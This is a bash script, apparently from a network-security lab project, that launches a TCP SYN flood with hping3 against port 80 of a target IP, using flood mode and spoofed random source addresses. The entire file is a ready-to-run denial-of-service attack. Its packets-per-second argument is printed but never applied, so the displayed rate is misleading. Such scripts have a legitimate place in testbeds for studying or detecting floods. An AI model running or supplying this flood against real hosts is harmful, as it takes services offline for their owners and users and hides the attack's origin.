#!/bin/bash
# TCP SYN Flood Attack Script
# Uses hping3 to generate TCP SYN flood traffic
#
# Usage: sudo bash attack/tcp_syn.sh <target_ip> [packets_per_second]
#
# Example:
#   sudo bash attack/tcp_syn.sh 10.0.2.1 1000

TARGET_IP=${1:-"10.0.2.1"}
PPS=${2:-1000}

echo "=== TCP SYN Flood Attack ==="
echo "Target: $TARGET_IP"
echo "Packets/sec: $PPS"
echo "Press Ctrl+C to stop"
echo "=========================="

# hping3 SYN flood with random source ports
sudo hping3 -S --flood -V -p 80 --rand-source $TARGET_IP
